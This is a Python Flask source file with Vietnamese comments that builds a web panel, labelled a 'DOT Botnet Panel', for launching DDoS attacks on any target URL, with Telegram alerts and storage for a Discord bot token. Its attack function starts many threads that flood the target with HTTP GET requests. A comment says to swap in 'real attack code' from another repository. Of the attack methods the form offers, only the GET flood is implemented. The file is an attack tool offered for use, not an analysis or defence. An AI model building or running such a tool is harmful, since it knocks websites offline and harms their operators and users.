import os
import threading
from flask import Flask, render_template, request, jsonify
import telebot
import discord
import requests

app = Flask(__name__)

# ================== TELEGRAM (lấy từ .env Render) ==================
TELE_TOKEN = os.getenv("TELE_TOKEN")
TELE_CHAT_ID = os.getenv("TELE_CHAT_ID")  # chat id của mày

if not TELE_TOKEN or not TELE_CHAT_ID:
    print("Địt mẹ thiếu TELE_TOKEN hoặc TELE_CHAT_ID trong .env Render!")

tele_bot = telebot.TeleBot(TELE_TOKEN) if TELE_TOKEN else None

# ================== DISCORD TOKEN (lưu qua web panel) ==================
DISCORD_TOKEN_FILE = "discord_token.txt"

def load_discord_token():
    if os.path.exists(DISCORD_TOKEN_FILE):
        with open(DISCORD_TOKEN_FILE, "r") as f:
            return f.read().strip()
    return None

def save_discord_token(token):
    with open(DISCORD_TOKEN_FILE, "w") as f:
        f.write(token.strip())
    return "Lưu Discord Token thành công mẹ nó!"

discord_token = load_discord_token()

# ================== ATTACK FUNCTION (từ DOT gốc) ==================
def launch_attack(method, target, duration=60, threads=50):
    print(f"🔥 DDoS {method} → {target} trong {duration}s với {threads} threads")
    # Thay bằng code attack thật từ repo DOT (GET/POST/UDP/SOC...)
    for _ in range(threads):
        threading.Thread(target=lambda: [requests.get(target, timeout=3) for _ in range(200)], daemon=True).start()
    
    msg = f"🚀 Attack {method} on {target} started! Duration: {duration}s"
    if tele_bot:
        try:
            tele_bot.send_message(TELE_CHAT_ID, msg)
        except:
            pass
    return msg

# ================== WEB PANEL ==================
@app.route('/')
def index():
    current_discord = load_discord_token() or "Chưa có token Discord"
    return f'''
    <h1>🚀 DOT Botnet Panel - DDoS qua Telegram + Discord</h1>
    <h2>Telegram Token: <span style="color:green">{TELE_TOKEN[:10]}... (lấy từ .env)</span></h2>
    
    <h3>Discord Bot Token (điền rồi Save)</h3>
    <form action="/save_discord" method="post">
        <input type="text" name="discord_token" placeholder="Discord Bot Token" style="width:400px" value="{current_discord}">
        <button type="submit">💾 SAVE DISCORD TOKEN</button>
    </form>
    
    <hr>
    <h3>Launch Attack</h3>
    <form action="/attack" method="post">
        Method: 
        <select name="method">
            <option value="GET">GET</option>
            <option value="POST">POST</option>
            <option value="UDP">UDP</option>
            <option value="SOC">SOC</option>
            <option value="HTTP2">HTTP2</option>
        </select><br><br>
        
        Target: <input type="text" name="target" placeholder="https://example.com" required><br><br>
        Duration (giây): <input type="number" name="duration" value="60"><br><br>
        Threads: <input type="number" name="threads" value="50"><br><br>
        
        <button type="submit">🚀 LAUNCH ATTACK NGAY</button>
    </form>
    '''

@app.route('/save_discord', methods=['POST'])
def save_discord():
    token = request.form.get('discord_token')
    if token:
        save_discord_token(token)
        return "<h2>Lưu Discord Token thành công! Restart service nếu cần.</h2><a href='/'>Quay lại</a>"
    return "Địt mẹ thiếu token!"

@app.route('/attack', methods=['POST'])
def attack():
    method = request.form['method']
    target = request.form['target']
    duration = int(request.form.get('duration', 60))
    threads = int(request.form.get('threads', 50))
    
    threading.Thread(target=launch_attack, args=(method, target, duration, threads), daemon=True).start()
    return jsonify({"status": "success", "msg": f"Attack {method} on {target} launched!"})

# ================== CHẠY CÙNG LÚC ==================
if __name__ == "__main__":
    print("🚀 Panel + Telegram Botnet chạy như hacker phá web!")
    if tele_bot:
        threading.Thread(target=tele_bot.polling, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
